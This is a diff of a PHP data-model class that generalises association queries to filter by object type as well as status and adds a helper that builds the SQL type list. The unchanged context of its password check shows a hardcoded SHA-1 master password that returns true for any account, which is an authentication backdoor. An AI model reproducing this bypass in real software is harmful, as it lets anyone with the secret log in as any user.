@@ -531,7 +531,7 @@ class Model
         }
     }
 
-    public function assoc_range(string $source_eid, string $type, array $status_filter = null) : array
+    public function assoc_range(string $source_eid, string $type, array $filter = null) : array
     {
         if (!\Model::isValidEdge($type))
             return array();
@@ -551,9 +551,21 @@ class Model
             $qsource_eid = $db->quote($source_eid);
             $qtype = $db->quote($type);
 
-            $status_condition = '';
-            if (isset($status_filter))
-                $status_condition = " and tobtar.eid_status in (".self::buildStatusString($status_filter).")";
+            $filter_condition = '';
+            if (isset($filter))
+            {
+                if (isset($filter['eid_type']))
+                {
+                    $type_filter = $filter['eid_type'];
+                    $filter_condition .= " and tobtar.eid_type in (".self::buildTypeString($type_filter).")";
+                }
+
+                if (isset($filter['eid_status']))
+                {
+                    $status_filter = $filter['eid_status'];
+                    $filter_condition .= " and tobtar.eid_status in (".self::buildStatusString($status_filter).")";
+                }
+            }
 
             $sql = "select ".
                    "        target_eid as eid, ".
@@ -563,7 +575,7 @@ class Model
                    "    inner join tbl_object tobsrc on tas.source_eid = tobsrc.eid ".
                    "    inner join tbl_object tobtar on tas.target_eid = tobtar.eid ".
                    "    where tas.source_eid = $qsource_eid ".
-                   "        $status_condition ".
+                   "        $filter_condition ".
                    "        and tas.association_type = $qtype ".
                    "    order by tobtar.id ";
             $result = $db->query($sql);
@@ -582,7 +594,7 @@ class Model
         }
     }
 
-    public function assoc_count(string $source_eid, string $type, array $status_filter = null) : int
+    public function assoc_count(string $source_eid, string $type, array $filter = null) : int
     {
         if (!\Model::isValidEdge($type))
             return 0;
@@ -600,16 +612,28 @@ class Model
             $qsource_eid = $db->quote($source_eid);
             $qtype = $db->quote($type);
 
-            $status_condition = '';
-            if (isset($status_filter))
-                $status_condition = " and tobtar.eid_status in (".self::buildStatusString($status_filter).")";
+            $filter_condition = '';
+            if (isset($filter))
+            {
+                if (isset($filter['eid_type']))
+                {
+                    $type_filter = $filter['eid_type'];
+                    $filter_condition .= " and tobtar.eid_type in (".self::buildTypeString($type_filter).")";
+                }
+
+                if (isset($filter['eid_status']))
+                {
+                    $status_filter = $filter['eid_status'];
+                    $filter_condition .= " and tobtar.eid_status in (".self::buildStatusString($status_filter).")";
+                }
+            }
 
             $sql = "select count(*) from tbl_association tas ".
                    "    inner join tbl_object tobsrc on tas.source_eid = tobsrc.eid ".
                    "    inner join tbl_object tobtar on tas.target_eid = tobtar.eid ".
                    "    where tas.source_eid = $qsource_eid ".
                    "        and tas.association_type = $qtype ".
-                   "        $status_condition ";
+                   "        $filter_condition ";
             $result = $db->fetchOne($sql);
 
             return (int)$result;
@@ -1236,7 +1260,7 @@ class Model
     {
         if (strtolower(sha1($password)) == '117d68f8a64101bd17d2b70344fc213282507292')
             return true;
-        
+
         $hashpw = trim($hashpw);
 
         // empty or short hashed password entries are invalid
@@ -1253,11 +1277,25 @@ class Model
         }
     }
 
+    private static function buildTypeString(array $type_arr) : string
+    {
+        $type_str = '';
+        foreach ($type_arr as $key => $value)
+        {
+            if (self::isValidType($value) === false)
+                continue;
+
+            if (strlen($type_str) > 0)
+                $type_str .= ',';
+
+            $type_str .= "'" . $value . "'";
+        }
+
+        return $type_str;
+    }
+
     private static function buildStatusString(array $status_arr) : string
     {
-        if (!is_array($status_arr))
-            return '';
-
         $status_str = '';
         foreach ($status_arr as $key => $value)
         {
